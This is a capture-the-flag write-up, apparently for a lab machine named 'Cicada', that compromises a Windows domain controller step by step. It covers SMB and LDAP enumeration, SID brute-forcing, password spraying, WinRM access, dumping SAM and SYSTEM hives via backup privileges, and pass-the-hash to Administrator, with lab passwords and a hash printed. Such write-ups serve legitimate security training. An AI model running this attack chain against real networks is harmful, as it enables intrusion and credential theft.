# Cicada - Easy

```sh
sudo vim /etc/hosts
# map cicada.htb

nmap -T4 -p- -A -Pn -v cicada.htb
```

* Open ports & services:

    * 53/tcp - domain - Simple DNS Plus
    * 88/tcp - kerberos-sec - Microsoft Windows Kerberos
    * 135/tcp - msrpc - Microsoft Windows RPC
    * 139/tcp - netbios-ssn - Microsoft Windows netbios-ssn
    * 389/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 445/tcp - microsoft-ds
    * 464/tcp - kpasswd5
    * 593/tcp - ncacn_http - Microsoft Windows RPC over HTTP 1.0
    * 636/tcp - ssl/ldap - Microsoft Windows Active Directory LDAP
    * 3268/tcp - ldap - Microsoft Windows Active Directory LDAP
    * 3269/tcp - ssl/ldap - Microsoft Windows Active Directory LDAP
    * 5985/tcp - http - Microsoft HTTPAPI httpd 2.0
    * 54571/tcp - msrpc - Microsoft Windows RPC

* Checking DNS:

    ```sh
    dig ns cicada.htb @10.10.11.35
    # we get a domain cicada-dc.cicada.htb

    dig any cicada.htb @10.10.11.35
    # we get another domain hostmaster.cicada.htb
    # we can revisit these later
    ```

* Checking for RPC info:

    ```sh
    rpcclient -U "" cicada.htb
    # empty password

    srvinfo

    enumdomains
    # NT_STATUS_ACCESS_DENIED
    # other queries also get denied
    ```

* Enumerate LDAP:

    ```sh
    ldapsearch -H ldap://cicada.htb -x

    # use namingcontexts flag
    ldapsearch -H ldap://cicada.htb -x -s base namingcontexts

    # use DC values found
    ldapsearch -H ldap://cicada.htb -x -b "DC=CICADA,DC=HTB"

    ldapsearch -H ldap://cicada.htb -x -b "DC=cicada,DC=HTB" "objectclass=user" sAMAccountName
    # no luck
    ```

* Enumerate SMB:

    ```sh
    smbclient -L \\\\cicada.htb
    # we have a couple of non-standard shares

    smbclient \\\\cicada.htb\\DEV
    # no password works, but cannot list contents

    smbclient \\\\cicada.htb\\HR
    # we can access the contents

    dir
    # we have a text file

    get "Notice from HR.txt"

    exit

    less "Notice from HR.txt"
    ```

* The text file gives us the default password used in Cicada Corp - "Cicada$M6Corpb*@Lp#nZp!8" - but we do not have an username yet; we do have an email ID 'support@cicada.htb'

* To enumerate usernames, we can check using tools such as ```rpcclient``` and ```lookupsid.py``` (part of SMB enumeration):

    ```sh
    rpcclient -U "" -N cicada.htb
    # this does not work

    rpcclient -U "" cicada.htb
    # this works with empty password, indicating anonymous login

    locate lookupsid.py
    # find script location

    python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@cicada.htb
    # as we had anonymous login supported, we can use the 'anonymous' username
    # and check if SIDs can be bruteforced

    # this gives us a bunch of usernames
    python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@cicada.htb | grep SidTypeUser
    
    # this does not work with '-no-pass', we need to try with and without mentioning username

    # samrdump.py
    python3 /usr/share/doc/python3-impacket/examples/samrdump.py cicada.htb
    ```

* Using ```lookupsid``` with the 'anonymous' username, we get a few usernames (SidTypeUser) - we can copy them to a file and use for further AD enumeration:

    ```sh
    vim usernames.txtid
    # paste all usernames found from lookupsid enum

    vim passwords.txt
    # paste the password found from the HR share

    crackmapexec smb -u usernames.txt -p passwords.txt --shares cicada.htb --continue-on-success
    # bruteforce and check for any valid creds
    ```

* ```crackmapexec``` shows that the password found earlier is valid for the user 'michael.wrightson' - we can now try to get access using these creds:

    ```sh
    evil-winrm -i cicada.htb -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8'
    # this does not work

    python3 /usr/share/doc/python3-impacket/examples/psexec.py cicada.htb/michael.wrightson:'Cicada$M6Corpb*@Lp#nZp!8'@cicada.htb
    # this also does not give us a shell

    # try to check the SMB shares from earlier
    smbclient -U michael.wrightson \\\\cicada.htb\\DEV
    # does not work for other shares as well

    # at this point, we can try using other tools from impacket for AD enumeration

    python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py cicada.htb/michael.wrightson -all -dc-ip cicada.htb

    python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py cicada.htb/michael.wrightson:'Cicada$M6Corpb*@Lp#nZp!8' -dc-ip cicada.htb -request

    python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.11.35 cicada.htb/ -usersfile usernames.txt -request

    # we can use the enum4linux-ng tool, we used the older version earlier

    enum4linux-ng cicada.htb -AC
    # -A for all basic enumeration
    # -C for getting services via RPC

    # we can try with known creds as well
    enum4linux-ng cicada.htb -A -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8'
    # this gives us another password
    ```

* Using the ```enum4linux-ng``` tool with known creds, from the users found via RPC, for username 'david.orelious', the description mentions the cleartext password 'aRt$Lp#7t*VQ!3' - add this to known passwords:

    ```sh
    vim passwords.txt
    # we have one more password now

    # try bruteforce again
    crackmapexec smb -u usernames.txt -p passwords.txt --shares cicada.htb --continue-on-success
    # the second password is valid for 'david.orelious'

    # we can try accessing the DEV share now using this password
    smbclient -U david.orelious \\\\cicada.htb\\DEV

    dir
    # we have a script here

    get Backup_script.ps1

    exit

    cat Backup_script.ps1
    ```

* The Powershell script contains a cleartext password 'Q!3@Lp#M6b*7t*Vt' for user 'emily.oscars' - one more password found:

    ```sh
    vim passwords.txt
    # add this password as well

    crackmapexec smb -u usernames.txt -p passwords.txt --shares cicada.htb --continue-on-success
    # the creds for emily are valid too

    evil-winrm -i cicada.htb -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
    # we get remote access as emily

    pwd
    # we can get the user flag from emily.oscar Desktop
    ```

* We can start with Windows enumeration now:

    ```cmd
    whoami
    # cicada\emily.oscars

    whoami /groups
    # check which groups we are a part of

    whoami /priv
    # check privileges
    # we have the following tokens enabled - SeBackupPrivilege, SeRestorePrivilege, SeShutdownPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege
    ```

* As SeBackupPrivilege & SeRestorePrivilege are enabled (this is because we are part of ```Backup Operators``` group), we can abuse them by creating a shadow copy and fetching some hives:

    ```cmd
    # in evil-winrm session
    reg save hklm\sam C:\Windows\Temp\sam

    reg save hklm\system C:\Windows\Temp\system

    download C:\Windows\Temp\sam /home/sv/cicada/sam

    download C:\Windows\Temp\system /home/sv/cicada/system
    ```

* We can try extracting hashes now in our attacker machine using ```secretsdump.py```:

    ```sh
    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam -system system LOCAL
    # this gives us hash for Administrator, we can use it for PtH

    evil-winrm -u Administrator -H 2b87e7c93a3e8a0ea4a581937016f341 -i cicada.htb
    # this works
    # we can get root flag from Administrator Desktop
    ```
